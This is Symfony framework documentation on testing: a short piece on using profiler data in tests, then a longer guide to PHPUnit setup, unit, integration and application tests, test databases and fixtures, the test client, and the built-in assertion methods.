    // tests/Controller/LuckyControllerTest.php
    namespace App\Tests\Controller;

    use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;

    class LuckyControllerTest extends WebTestCase
    {
        public function testRandomNumber(): void
        {
            $client = static::createClient();

            // enable the profiler only for the next request (if you make
            // new requests, you must call this method again)
            // (it does nothing if the profiler is not available)
            $client->enableProfiler();

            $crawler = $client->request('GET', '/lucky/number');

            // ... write some assertions about the Response

            // check that the profiler is enabled
            if ($profile = $client->getProfile()) {
                // check the number of requests
                $this->assertLessThan(
                    10,
                    $profile->getCollector('db')->getQueryCount()
                );

                // check the time spent in the framework
                $this->assertLessThan(
                    500,
                    $profile->getCollector('time')->getDuration()
                );
            }
        }
    }

If a test fails because of profiling data (too many DB queries for instance),
you might want to use the Web Profiler to analyze the request after the tests
finish. It can be achieved by embedding the token in the error message::

    $this->assertLessThan(
        30,
        $profile->getCollector('db')->getQueryCount(),
        sprintf(
            'Checks that query count is less than 30 (token %s)',
            $profile->getToken()
        )
    );

.. note::

    The profiler information is available even if you :doc:`insulate the client </testing/insulating_clients>`
    or if you use an HTTP layer for your tests.

.. tip::

    Read the API for built-in :ref:`data collectors <profiler-data-collector>`
    to learn more about their interfaces.
Testing
=======

Whenever you write a new line of code, you also potentially add new bugs.
To build better and more reliable applications, you should test your code
using both functional and unit tests.

.. _testing-installation:

The PHPUnit Testing Framework
-----------------------------

Symfony integrates with an independent library called `PHPUnit`_ to give
you a rich testing framework. This article won't cover PHPUnit itself,
which has its own excellent `documentation`_.

Before creating your first test, install ``symfony/test-pack``, which installs
some other packages needed for testing (such as ``phpunit/phpunit``):

.. code-block:: terminal

    $ composer require --dev symfony/test-pack

After the library is installed, try running PHPUnit:

.. code-block:: terminal

    $ php bin/phpunit

This command automatically runs your application tests. Each test is a
PHP class ending with "Test" (e.g. ``BlogControllerTest``) that lives in
the ``tests/`` directory of your application.

PHPUnit is configured by the ``phpunit.xml.dist`` file in the root of your
application. The default configuration provided by Symfony Flex will be
enough in most cases. Read the `PHPUnit documentation`_ to discover all
possible configuration options (e.g. to enable code coverage or to split
your test into multiple "test suites").

.. note::

    :ref:`Symfony Flex <symfony-flex>` automatically creates
    ``phpunit.xml.dist`` and ``tests/bootstrap.php``. If these files are
    missing, you can try running the recipe again using
    ``composer recipes:install phpunit/phpunit --force -v``.

Types of Tests
--------------

There are many types of automated tests and precise definitions often
differ from project to project. In Symfony, the following definitions are
used. If you have learned something different, that is not necessarily
wrong, just different from what the Symfony documentation is using.

`Unit Tests`_
    These tests ensure that *individual* units of source code (e.g. a single
    class) behave as intended.

`Integration Tests`_
    These tests test a combination of classes and commonly interact with
    Symfony's service container. These tests do not yet cover the fully
    working application, those are called *Application tests*.

`Application Tests`_
    Application tests test the behavior of a complete application. They
    make HTTP requests (both real and simulated ones) and test that the
    response is as expected.

Unit Tests
----------

A `unit test`_ ensures that individual units of source code (e.g. a single
class or some specific method in some class) meet their design and behave
as intended. Writing unit tests in a Symfony application is no different
from writing standard PHPUnit unit tests. You can learn about it in the
PHPUnit documentation: `Writing Tests for PHPUnit`_.

By convention, the ``tests/`` directory should replicate the directory
of your application for unit tests. So, if you're testing a class in the
``src/Form/`` directory, put the test in the ``tests/Form/`` directory.
Autoloading is automatically enabled via the ``vendor/autoload.php`` file
(as configured by default in the ``phpunit.xml.dist`` file).

You can run tests using the ``bin/phpunit`` command:

.. code-block:: terminal

    # run all tests of the application
    $ php bin/phpunit

    # run all tests in the Form/ directory
    $ php bin/phpunit tests/Form

    # run tests for the UserType class
    $ php bin/phpunit tests/Form/UserTypeTest.php

.. tip::

    In large test suites, it can make sense to create subdirectories for
    each type of tests (e.g. ``tests/Unit/`` and ``tests/Functional/``).

.. _integration-tests:

Integration Tests
-----------------

An integration test will test a larger part of your application compared to
a unit test (e.g. a combination of services). Integration tests might want
to use the Symfony Kernel to fetch a service from the dependency injection
container.

Symfony provides a :class:`Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase`
class to help you creating and booting the kernel in your tests using
``bootKernel()``::

    // tests/Service/NewsletterGeneratorTest.php
    namespace App\Tests\Service;

    use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;

    class NewsletterGeneratorTest extends KernelTestCase
    {
        public function testSomething(): void
        {
            self::bootKernel();

            // ...
        }
    }

The ``KernelTestCase`` also makes sure your kernel is rebooted for each
test. This assures that each test is run independently from each other.

To run your application tests, the ``KernelTestCase`` class needs to
find the application kernel to initialize. The kernel class is
usually defined in the ``KERNEL_CLASS`` environment variable
(included in the default ``.env.test`` file provided by Symfony Flex):

.. code-block:: env

    # .env.test
    KERNEL_CLASS=App\Kernel

.. note::

    If your use case is more complex, you can also override the
    ``getKernelClass()`` or ``createKernel()`` methods of your functional
    test, which takes precedence over the ``KERNEL_CLASS`` env var.

Set-up your Test Environment
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The tests create a kernel that runs in the ``test``
:ref:`environment <configuration-environments>`. This allows to have
special settings for your tests inside ``config/packages/test/``.

If you have Symfony Flex installed, some packages already installed some
useful test configuration. For example, by default, the Twig bundle is
configured to be especially strict to catch errors before deploying your
code to production:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/test/twig.yaml
        twig:
            strict_variables: true

    .. code-block:: xml

        <!-- config/packages/test/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <framework:config strict-variables="true"/>
        </container>

    .. code-block:: php

        // config/packages/test/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            $twig->strictVariables(true);
        };

You can also use a different environment entirely, or override the default
debug mode (``true``) by passing each as options to the ``bootKernel()``
method::

    self::bootKernel([
        'environment' => 'my_test_env',
        'debug'       => false,
    ]);

.. tip::

    It is recommended to run your test with ``debug`` set to ``false`` on
    your CI server, as it significantly improves test performance. This
    disables clearing the cache. If your tests don't run in a clean
    environment each time, you have to manually clear it using for instance
    this code in ``tests/bootstrap.php``::

        // ...

        // ensure a fresh cache when debug mode is disabled
        (new \Symfony\Component\Filesystem\Filesystem())->remove(__DIR__.'/../var/cache/test');

Customizing Environment Variables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to customize some environment variables for your tests (e.g. the
``DATABASE_URL`` used by Doctrine), you can do that by overriding anything you
need in your ``.env.test`` file:

.. code-block:: env

    # .env.test

    # ...
    DATABASE_URL="mysql://db_user:db_password@127.0.0.1:3306/db_name_test?serverVersion=5.7"

In the test environment, these env files are read (if vars are duplicated
in them, files lower in the list override previous items):

#. ``.env``: containing env vars with application defaults;
#. ``.env.test``: overriding/setting specific test values or vars;
#. ``.env.test.local``: overriding settings specific for this machine.

.. caution::

    The ``.env.local`` file is **not** used in the test environment, to
    make each test set-up as consistent as possible.

Retrieving Services in the Test
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In your integration tests, you often need to fetch the service from the
service container to call a specific method. After booting the kernel,
the container is returned by ``static::getContainer()``::

    // tests/Service/NewsletterGeneratorTest.php
    namespace App\Tests\Service;

    use App\Service\NewsletterGenerator;
    use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;

    class NewsletterGeneratorTest extends KernelTestCase
    {
        public function testSomething(): void
        {
            // (1) boot the Symfony kernel
            self::bootKernel();

            // (2) use static::getContainer() to access the service container
            $container = static::getContainer();

            // (3) run some service & test the result
            $newsletterGenerator = $container->get(NewsletterGenerator::class);
            $newsletter = $newsletterGenerator->generateMonthlyNews(/* ... */);

            $this->assertEquals('...', $newsletter->getContent());
        }
    }

The container from ``static::getContainer()`` is actually a special test container.
It gives you access to both the public services and the non-removed
:ref:`private services <container-public>`.

.. note::

    If you need to test private services that have been removed (those who
    are not used by any other services), you need to declare those private
    services as public in the ``config/services_test.yaml`` file.

Mocking Dependencies
--------------------

Sometimes it can be useful to mock a dependency of a tested service.
From the example in the previous section, let's assume the
``NewsletterGenerator`` has a dependency to a private alias
``NewsRepositoryInterface`` pointing to a private ``NewsRepository`` service
and you'd like to use a mocked ``NewsRepositoryInterface`` instead of the
concrete one::

    // ...
    use App\Contracts\Repository\NewsRepositoryInterface;

    class NewsletterGeneratorTest extends KernelTestCase
    {
        public function testSomething(): void
        {
            // ... same bootstrap as the section above

            $newsRepository = $this->createMock(NewsRepositoryInterface::class);
            $newsRepository->expects(self::once())
                ->method('findNewsFromLastMonth')
                ->willReturn([
                    new News('some news'),
                    new News('some other news'),
                ])
            ;

            $container->set(NewsRepositoryInterface::class, $newsRepository);

            // will be injected the mocked repository
            $newsletterGenerator = $container->get(NewsletterGenerator::class);

            // ...
        }
    }

No further configuration in required, as the test service container is a special one
that allows you to interact with private services and aliases.

.. _testing-databases:

Configuring a Database for Tests
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tests that interact with the database should use their own separate
database to not mess with the databases used in the other
:ref:`configuration environments <configuration-environments>`.

To do that, edit or create the ``.env.test.local`` file at the root
directory of your project and define the new value for the ``DATABASE_URL``
env var:

.. code-block:: env

    # .env.test.local
    DATABASE_URL="mysql://USERNAME:PASSWORD@127.0.0.1:3306/DB_NAME?serverVersion=5.7"

This assumes that each developer/machine uses a different database for the
tests. If the test set-up is the same on each machine, use the ``.env.test``
file instead and commit it to the shared repository. Learn more about
:ref:`using multiple .env files in Symfony applications <configuration-multiple-env-files>`.

After that, you can create the test database and all tables using:

.. code-block:: terminal

    # create the test database
    $ php bin/console --env=test doctrine:database:create

    # create the tables/columns in the test database
    $ php bin/console --env=test doctrine:schema:create

.. tip::

    You can run these commands to create the database during the
    :doc:`test bootstrap process <testing/bootstrap>`.

.. tip::

    A common practice is to append the ``_test`` suffix to the original
    database names in tests. If the database name in production is called
    ``project_acme`` the name of the testing database could be
    ``project_acme_test``.

Resetting the Database Automatically Before each Test
.....................................................

Tests should be independent from each other to avoid side effects. For
example, if some test modifies the database (by adding or removing an
entity) it could change the results of other tests.

The `DAMADoctrineTestBundle`_ uses Doctrine transactions to let each test
interact with an unmodified database. Install it using:

.. code-block:: terminal

    $ composer require --dev dama/doctrine-test-bundle

Now, enable it as a PHPUnit extension:

.. code-block:: xml

    <!-- phpunit.xml.dist -->
    <phpunit>
        <!-- ... -->

        <extensions>
            <extension class="DAMA\DoctrineTestBundle\PHPUnit\PHPUnitExtension"/>
        </extensions>
    </phpunit>

That's it! This bundle uses a clever trick: it begins a database
transaction before every test and rolls it back automatically after the
test finishes to undo all changes. Read more in the documentation of the
`DAMADoctrineTestBundle`_.

.. _doctrine-fixtures:

Load Dummy Data Fixtures
........................

Instead of using the real data from the production database, it's common to
use fake or dummy data in the test database. This is usually called
*"fixtures data"* and Doctrine provides a library to create and load them.
Install it with:

.. code-block:: terminal

    $ composer require --dev doctrine/doctrine-fixtures-bundle

Then, use the ``make:fixtures`` command of the `SymfonyMakerBundle`_ to
generate an empty fixture class:

.. code-block:: terminal

    $ php bin/console make:fixtures

    The class name of the fixtures to create (e.g. AppFixtures):
    > ProductFixture

Then you modify and use this class to load new entities in the database. For
instance, to load ``Product`` objects into Doctrine, use::

    // src/DataFixtures/ProductFixture.php
    namespace App\DataFixtures;

    use App\Entity\Product;
    use Doctrine\Bundle\FixturesBundle\Fixture;
    use Doctrine\Persistence\ObjectManager;

    class ProductFixture extends Fixture
    {
        public function load(ObjectManager $manager): void
        {
            $product = new Product();
            $product->setName('Priceless widget');
            $product->setPrice(14.50);
            $product->setDescription('Ok, I guess it *does* have a price');
            $manager->persist($product);

            // add more products

            $manager->flush();
        }
    }

Empty the database and reload *all* the fixture classes with:

.. code-block:: terminal

    $ php bin/console --env=test doctrine:fixtures:load

For more information, read the `DoctrineFixturesBundle documentation`_.

.. _functional-tests:

Application Tests
-----------------

Application tests check the integration of all the different layers of the
application (from the routing to the views). They are no different from
unit tests or integration tests as far as PHPUnit is concerned, but they
have a very specific workflow:

#. :ref:`Make a request <testing-applications-arrange>`;
#. :ref:`Interact with the page <testing-applications-act>` (e.g. click on a link or submit a form);
#. :ref:`Test the response <testing-application-assertions>`;
#. Rinse and repeat.

.. note::

    The tools used in this section can be installed via the ``symfony/test-pack``,
    use ``composer require symfony/test-pack`` if you haven't done so already.

Write Your First Application Test
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Application tests are PHP files that typically live in the ``tests/Controller/``
directory of your application. They often extend
:class:`Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase`. This class
adds special logic on top of the ``KernelTestCase``. You can read more
about that in the above :ref:`section on integration tests <integration-tests>`.

If you want to test the pages handled by your
``PostController`` class, start by creating a new ``PostControllerTest``
using the ``make:test`` command of the `SymfonyMakerBundle`_:

.. code-block:: terminal

    $ php bin/console make:test

     Which test type would you like?:
     > WebTestCase

     The name of the test class (e.g. BlogPostTest):
     > Controller\PostControllerTest

This creates the following test class::

    // tests/Controller/PostControllerTest.php
    namespace App\Tests\Controller;

    use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;

    class PostControllerTest extends WebTestCase
    {
        public function testSomething(): void
        {
            // This calls KernelTestCase::bootKernel(), and creates a
            // "client" that is acting as the browser
            $client = static::createClient();

            // Request a specific page
            $crawler = $client->request('GET', '/');

            // Validate a successful response and some content
            $this->assertResponseIsSuccessful();
            $this->assertSelectorTextContains('h1', 'Hello World');
        }
    }

In the above example, the test validates that the HTTP response was successful
and the request body contains a ``<h1>`` tag with ``"Hello world"``.

The ``request()`` method also returns a crawler, which you can use to
create more complex assertions in your tests (e.g. to count the number of page
elements that match a given CSS selector)::

    $crawler = $client->request('GET', '/post/hello-world');
    $this->assertCount(4, $crawler->filter('.comment'));

You can learn more about the crawler in :doc:`/testing/dom_crawler`.

.. _testing-applications-arrange:

Making Requests
~~~~~~~~~~~~~~~

The test client simulates an HTTP client like a browser and makes requests
into your Symfony application::

    $crawler = $client->request('GET', '/post/hello-world');

The :method:`request() <Symfony\\Component\\BrowserKit\\AbstractBrowser::request>` method takes the HTTP method and a URL as arguments and
returns a ``Crawler`` instance.

.. tip::

    Hardcoding the request URLs is a best practice for application tests.
    If the test generates URLs using the Symfony router, it won't detect
    any change made to the application URLs which may impact the end users.

The full signature of the ``request()`` method is::

    public function request(
        string $method,
        string $uri,
        array $parameters = [],
        array $files = [],
        array $server = [],
        ?string $content = null,
        bool $changeHistory = true
    ): Crawler

This allows you to create all types of requests you can think of:

.. tip::

    The test client is available as the ``test.client`` service in the
    container in the ``test`` environment (or wherever the
    :ref:`framework.test <reference-framework-test>` option is enabled).
    This means you can override the service entirely if you need to.

Multiple Requests in One Test
.............................

After making a request, subsequent requests will make the client reboot the kernel.
This recreates the container from scratch to ensures that requests are isolated
and use new service objects each time. This behavior can have some unexpected
consequences: for example, the security token will be cleared, Doctrine entities
will be detached, etc.

First, you can call the client's :method:`Symfony\\Bundle\\FrameworkBundle\\KernelBrowser::disableReboot`
method to reset the kernel instead of rebooting it. In practice, Symfony
will call the ``reset()`` method of every service tagged with ``kernel.reset``.
However, this will **also** clear the security token, detach Doctrine entities, etc.

In order to solve this issue, create a :doc:`compiler pass </service_container/compiler_passes>`
to remove the ``kernel.reset`` tag from some services in your test environment::

    // src/Kernel.php
    namespace App;

    use Symfony\Bundle\FrameworkBundle\Kernel\MicroKernelTrait;
    use Symfony\Component\DependencyInjection\Compiler\CompilerPassInterface;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\HttpKernel\Kernel as BaseKernel;

    class Kernel extends BaseKernel implements CompilerPassInterface
    {
        use MicroKernelTrait;

        // ...

        protected function process(ContainerBuilder $container): void
        {
            if ('test' === $this->environment) {
                // prevents the security token to be cleared
                $container->getDefinition('security.token_storage')->clearTag('kernel.reset');

                // prevents Doctrine entities to be detached
                $container->getDefinition('doctrine')->clearTag('kernel.reset');

                // ...
            }
        }
    }

Browsing the Site
.................

The Client supports many operations that can be done in a real browser::

    $client->back();
    $client->forward();
    $client->reload();

    // clears all cookies and the history
    $client->restart();

.. note::

    The ``back()`` and ``forward()`` methods skip the redirects that may have
    occurred when requesting a URL, as normal browsers do.

Redirecting
...........

When a request returns a redirect response, the client does not follow
it automatically. You can examine the response and force a redirection
afterwards with the ``followRedirect()`` method::

    $crawler = $client->followRedirect();

If you want the client to automatically follow all redirects, you can
force them by calling the ``followRedirects()`` method before performing the request::

    $client->followRedirects();

If you pass ``false`` to the ``followRedirects()`` method, the redirects
will no longer be followed::

    $client->followRedirects(false);

.. _testing_logging_in_users:

Logging in Users (Authentication)
.................................

When you want to add application tests for protected pages, you have to
first "login" as a user. Reproducing the actual steps - such as
submitting a login form - makes a test very slow. For this reason, Symfony
provides a ``loginUser()`` method to simulate logging in your functional
tests.

Instead of logging in with real users, it's recommended to create a user
only for tests. You can do that with `Doctrine data fixtures`_ to load the
testing users only in the test database.

After loading users in your database, use your user repository to fetch
this user and use
:method:`$client->loginUser() <Symfony\\Bundle\\FrameworkBundle\\KernelBrowser::loginUser>`
to simulate a login request::

    // tests/Controller/ProfileControllerTest.php
    namespace App\Tests\Controller;

    use App\Repository\UserRepository;
    use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;

    class ProfileControllerTest extends WebTestCase
    {
        // ...

        public function testVisitingWhileLoggedIn(): void
        {
            $client = static::createClient();
            $userRepository = static::getContainer()->get(UserRepository::class);

            // retrieve the test user
            $testUser = $userRepository->findOneByEmail('john.doe@example.com');

            // simulate $testUser being logged in
            $client->loginUser($testUser);

            // test e.g. the profile page
            $client->request('GET', '/profile');
            $this->assertResponseIsSuccessful();
            $this->assertSelectorTextContains('h1', 'Hello John!');
        }
    }

You can pass any
:class:`Symfony\\Component\\Security\\Core\\User\\UserInterface` instance to
``loginUser()``. This method creates a special
:class:`Symfony\\Bundle\\FrameworkBundle\\Test\\TestBrowserToken` object and
stores in the session of the test client. If you need to define custom
attributes in this token, you can use the ``tokenAttributes`` argument of the
:method:`Symfony\\Bundle\\FrameworkBundle\\KernelBrowser::loginUser` method.

.. note::

    By design, the ``loginUser()`` method doesn't work when using stateless firewalls.
    Instead, add the appropriate token/header in each ``request()`` call.

Making AJAX Requests
....................

The client provides an
:method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::xmlHttpRequest`
method, which has the same arguments as the ``request()`` method and is
a shortcut to make AJAX requests::

    // the required HTTP_X_REQUESTED_WITH header is added automatically
    $client->xmlHttpRequest('POST', '/submit', ['name' => 'Fabien']);

Sending Custom Headers
......................

If your application behaves according to some HTTP headers, pass them as the
second argument of ``createClient()``::

    $client = static::createClient([], [
        'HTTP_HOST'       => 'en.example.com',
        'HTTP_USER_AGENT' => 'MySuperBrowser/1.0',
    ]);

You can also override HTTP headers on a per request basis::

    $client->request('GET', '/', [], [], [
        'HTTP_HOST'       => 'en.example.com',
        'HTTP_USER_AGENT' => 'MySuperBrowser/1.0',
    ]);

.. caution::

    The name of your custom headers must follow the syntax defined in the
    `section 4.1.18 of RFC 3875`_: replace ``-`` by ``_``, transform it into
    uppercase and prefix the result with ``HTTP_``. For example, if your
    header name is ``X-Session-Token``, pass ``HTTP_X_SESSION_TOKEN``.

Reporting Exceptions
....................

Debugging exceptions in application tests may be difficult because by default
they are caught and you need to look at the logs to see which exception was
thrown. Disabling catching of exceptions in the test client allows the exception
to be reported by PHPUnit::

    $client->catchExceptions(false);

Accessing Internal Objects
..........................

If you use the client to test your application, you might want to access the
client's internal objects::

    $history = $client->getHistory();
    $cookieJar = $client->getCookieJar();

You can also get the objects related to the latest request::

    // the HttpKernel request instance
    $request = $client->getRequest();

    // the BrowserKit request instance
    $request = $client->getInternalRequest();

    // the HttpKernel response instance
    $response = $client->getResponse();

    // the BrowserKit response instance
    $response = $client->getInternalResponse();

    // the Crawler instance
    $crawler = $client->getCrawler();

Accessing the Profiler Data
...........................

On each request, you can enable the Symfony profiler to collect data about the
internal handling of that request. For example, the profiler could be used to
verify that a given page runs less than a certain number of database
queries when loading.

To get the profiler for the last request, do the following::

    // enables the profiler for the very next request
    $client->enableProfiler();

    $crawler = $client->request('GET', '/profiler');

    // gets the profile
    $profile = $client->getProfile();

For specific details on using the profiler inside a test, see the
:doc:`/testing/profiling` article.

.. _testing-applications-act:

Interacting with the Response
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Like a real browser, the Client and Crawler objects can be used to interact
with the page you're served:

.. _testing-links:

Clicking on Links
.................

Use the ``clickLink()`` method to click on the first link that contains the
given text (or the first clickable image with that ``alt`` attribute)::

    $client = static::createClient();
    $client->request('GET', '/post/hello-world');

    $client->clickLink('Click here');

If you need access to the :class:`Symfony\\Component\\DomCrawler\\Link` object
that provides helpful methods specific to links (such as ``getMethod()`` and
``getUri()``), use the ``Crawler::selectLink()`` method instead::

    $client = static::createClient();
    $crawler = $client->request('GET', '/post/hello-world');

    $link = $crawler->selectLink('Click here')->link();
    // ...

    // use click() if you want to click the selected link
    $client->click($link);

.. _testing-forms:

Submitting Forms
................

Use the ``submitForm()`` method to submit the form that contains the given button::

    $client = static::createClient();
    $client->request('GET', '/post/hello-world');

    $crawler = $client->submitForm('Add comment', [
        'comment_form[content]' => '...',
    ]);

The first argument of ``submitForm()`` is the text content, ``id``, ``value`` or
``name`` of any ``<button>`` or ``<input type="submit">`` included in the form.
The second optional argument is used to override the default form field values.

.. note::

    Notice that you select form buttons and not forms, as a form can have several
    buttons. If you use the traversing API, keep in mind that you must look for a
    button.

If you need access to the :class:`Symfony\\Component\\DomCrawler\\Form` object
that provides helpful methods specific to forms (such as ``getUri()``,
``getValues()`` and ``getFields()``) use the ``Crawler::selectButton()`` method instead::

    $client = static::createClient();
    $crawler = $client->request('GET', '/post/hello-world');

    // select the button
    $buttonCrawlerNode = $crawler->selectButton('submit');

    // retrieve the Form object for the form belonging to this button
    $form = $buttonCrawlerNode->form();

    // set values on a form object
    $form['my_form[name]'] = 'Fabien';
    $form['my_form[subject]'] = 'Symfony rocks!';

    // submit the Form object
    $client->submit($form);

    // optionally, you can combine the last 2 steps by passing an array of
    // field values while submitting the form:
    $client->submit($form, [
        'my_form[name]'    => 'Fabien',
        'my_form[subject]' => 'Symfony rocks!',
    ]);

Based on the form type, you can use different methods to fill in the
input::

    // selects an option or a radio
    $form['my_form[country]']->select('France');

    // ticks a checkbox
    $form['my_form[like_symfony]']->tick();

    // uploads a file
    $form['my_form[photo]']->upload('/path/to/lucas.jpg');

    // In the case of a multiple file upload
    $form['my_form[field][0]']->upload('/path/to/lucas.jpg');
    $form['my_form[field][1]']->upload('/path/to/lisa.jpg');

.. tip::

    Instead of hardcoding the form name as part of the field names (e.g.
    ``my_form[...]`` in previous examples), you can use the
    :method:`Symfony\\Component\\DomCrawler\\Form::getName` method to get the
    form name.

.. tip::

    If you purposefully want to select "invalid" select/radio values, see
    :ref:`components-dom-crawler-invalid`.

.. tip::

    You can get the values that will be submitted by calling the ``getValues()``
    method on the ``Form`` object. The uploaded files are available in a
    separate array returned by ``getFiles()``. The ``getPhpValues()`` and
    ``getPhpFiles()`` methods also return the submitted values, but in the
    PHP format (it converts the keys with square brackets notation - e.g.
    ``my_form[subject]`` - to PHP arrays).

.. tip::

    The ``submit()`` and ``submitForm()`` methods define optional arguments to
    add custom server parameters and HTTP headers when submitting the form::

        $client->submit($form, [], ['HTTP_ACCEPT_LANGUAGE' => 'es']);
        $client->submitForm($button, [], 'POST', ['HTTP_ACCEPT_LANGUAGE' => 'es']);

.. _testing-application-assertions:

Testing the Response (Assertions)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now that the tests have visited a page and interacted with it (e.g. filled
in a form), it is time to verify that the expected output is shown.

As all tests are based on PHPUnit, you can use any `PHPUnit Assertion`_ in
your tests. Combined with test Client and the Crawler, this allows you to
check anything you want.

However, Symfony provides useful shortcut methods for the most common cases:

Response Assertions
...................

``assertResponseIsSuccessful(string $message = '')``
    Asserts that the response was successful (HTTP status is 2xx).
``assertResponseStatusCodeSame(int $expectedCode, string $message = '')``
    Asserts a specific HTTP status code.
``assertResponseRedirects(?string $expectedLocation = null, ?int $expectedCode = null, string $message = '')``
    Asserts the response is a redirect response (optionally, you can check
    the target location and status code). The excepted location can be either
    an absolute or a relative path.
``assertResponseHasHeader(string $headerName, string $message = '')``/``assertResponseNotHasHeader(string $headerName, string $message = '')``
    Asserts the given header is (not) available on the response, e.g. ``assertResponseHasHeader('content-type');``.
``assertResponseHeaderSame(string $headerName, string $expectedValue, string $message = '')``/``assertResponseHeaderNotSame(string $headerName, string $expectedValue, string $message = '')``
    Asserts the given header does (not) contain the expected value on the
    response, e.g. ``assertResponseHeaderSame('content-type', 'application/octet-stream');``.
``assertResponseHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``/``assertResponseNotHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``
    Asserts the given cookie is present in the response (optionally
    checking for a specific cookie path or domain).
``assertResponseCookieValueSame(string $name, string $expectedValue, string $path = '/', ?string $domain = null, string $message = '')``
    Asserts the given cookie is present and set to the expected value.
``assertResponseFormatSame(?string $expectedFormat, string $message = '')``
    Asserts the response format returned by the
    :method:`Symfony\\Component\\HttpFoundation\\Response::getFormat` method
    is the same as the expected value.
``assertResponseIsUnprocessable(string $message = '')``
    Asserts the response is unprocessable (HTTP status is 422)

Request Assertions
..................

``assertRequestAttributeValueSame(string $name, string $expectedValue, string $message = '')``
    Asserts the given :ref:`request attribute <component-foundation-attributes>`
    is set to the expected value.
``assertRouteSame($expectedRoute, array $parameters = [], string $message = '')``
    Asserts the request matches the given route and optionally route parameters.

Browser Assertions
..................

``assertBrowserHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``/``assertBrowserNotHasCookie(string $name, string $path = '/', ?string $domain = null, string $message = '')``
    Asserts that the test Client does (not) have the given cookie set
    (meaning, the cookie was set by any response in the test).
``assertBrowserCookieValueSame(string $name, string $expectedValue, string $path = '/', ?string $domain = null, string $message = '')``
    Asserts the given cookie in the test Client is set to the expected
    value.
``assertThatForClient(Constraint $constraint, string $message = '')``
    Asserts the given Constraint in the Client. Useful for using your custom asserts
    in the same way as built-in asserts (i.e. without passing the Client as argument)::

        // add this method in some custom class imported in your tests
        protected static function assertMyOwnCustomAssert(): void
        {
            self::assertThatForClient(new SomeCustomConstraint());
        }

Crawler Assertions
..................

``assertSelectorExists(string $selector, string $message = '')``/``assertSelectorNotExists(string $selector, string $message = '')``
    Asserts that the given selector does (not) match at least one element
    in the response.
``assertSelectorCount(int $expectedCount, string $selector, string $message = '')``
    Asserts that the expected number of selector elements are in the response
``assertSelectorTextContains(string $selector, string $text, string $message = '')``/``assertSelectorTextNotContains(string $selector, string $text, string $message = '')``
    Asserts that the first element matching the given selector does (not)
    contain the expected text.
``assertAnySelectorTextContains(string $selector, string $text, string $message = '')``/``assertAnySelectorTextNotContains(string $selector, string $text, string $message = '')``
    Asserts that any element matching the given selector does (not)
    contain the expected text.
``assertSelectorTextSame(string $selector, string $text, string $message = '')``
    Asserts that the contents of the first element matching the given
    selector does equal the expected text.
``assertAnySelectorTextSame(string $selector, string $text, string $message = '')``
    Asserts that the any element matching the given selector does equal the
    expected text.
``assertPageTitleSame(string $expectedTitle, string $message = '')``
    Asserts that the ``<title>`` element is equal to the given title.
``assertPageTitleContains(string $expectedTitle, string $message = '')``
    Asserts that the ``<title>`` element contains the given title.
``assertInputValueSame(string $fieldName, string $expectedValue, string $message = '')``/``assertInputValueNotSame(string $fieldName, string $expectedValue, string $message = '')``
    Asserts that value of the form input with the given name does (not)
    equal the expected value.
``assertCheckboxChecked(string $fieldName, string $message = '')``/``assertCheckboxNotChecked(string $fieldName, string $message = '')``
    Asserts that the checkbox with the given name is (not) checked.
``assertFormValue(string $formSelector, string $fieldName, string $value, string $message = '')``/``assertNoFormValue(string $formSelector, string $fieldName, string $message = '')``
    Asserts that value of the field of the first form matching the given
    selector does (not) equal the expected value.

.. _mailer-assertions:

Mailer Assertions
.................

``assertEmailCount(int $count, ?string $transport = null, string $message = '')``
    Asserts that the expected number of emails was sent.
``assertQueuedEmailCount(int $count, ?string $transport = null, string $message = '')``
    Asserts that the expected number of emails was queued (e.g. using the
    Messenger component).
``assertEmailIsQueued(MessageEvent $event, string $message = '')``/``assertEmailIsNotQueued(MessageEvent $event, string $message = '')``
    Asserts that the given mailer event is (not) queued. Use
    ``getMailerEvent(int $index = 0, ?string $transport = null)`` to
    retrieve a mailer event by index.
``assertEmailAttachmentCount(RawMessage $email, int $count, string $message = '')``
    Asserts that the given email has the expected number of attachments. Use
    ``getMailerMessage(int $index = 0, ?string $transport = null)`` to
    retrieve a specific email by index.
``assertEmailTextBodyContains(RawMessage $email, string $text, string $message = '')``/``assertEmailTextBodyNotContains(RawMessage $email, string $text, string $message = '')``
    Asserts that the text body of the given email does (not) contain the
    expected text.
``assertEmailHtmlBodyContains(RawMessage $email, string $text, string $message = '')``/``assertEmailHtmlBodyNotContains(RawMessage $email, string $text, string $message = '')``
    Asserts that the HTML body of the given email does (not) contain the
    expected text.
``assertEmailHasHeader(RawMessage $email, string $headerName, string $message = '')``/``assertEmailNotHasHeader(RawMessage $email, string $headerName, string $message = '')``
    Asserts that the given email does (not) have the expected header set.
``assertEmailHeaderSame(RawMessage $email, string $headerName, string $expectedValue, string $message = '')``/``assertEmailHeaderNotSame(RawMessage $email, string $headerName, string $expectedValue, string $message = '')``
    Asserts that the given email does (not) have the expected header set to
    the expected value.
